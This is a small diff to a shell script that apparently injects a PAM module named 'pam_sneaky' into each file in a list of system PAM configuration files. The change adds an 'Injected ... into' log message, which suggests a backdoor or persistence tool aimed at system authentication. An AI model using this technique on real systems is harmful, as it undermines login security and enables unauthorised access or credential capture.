@@ -64,5 +64,8 @@ function bug_file(){
 
 # Bug all the files to use pam_sneaky
 for PAM_FILE in ${PAM_BUG_FILES[@]}; do
-  bug_file ${PAM_CONFIG_DIR}${PAM_FILE}
+    FULL_FILE="${PAM_CONFIG_DIR}${PAM_FILE}"
+
+    echo "[+] Injected ${PAM_OBJECT} into $FULL_FILE"
+    bug_file $FULL_FILE
 done
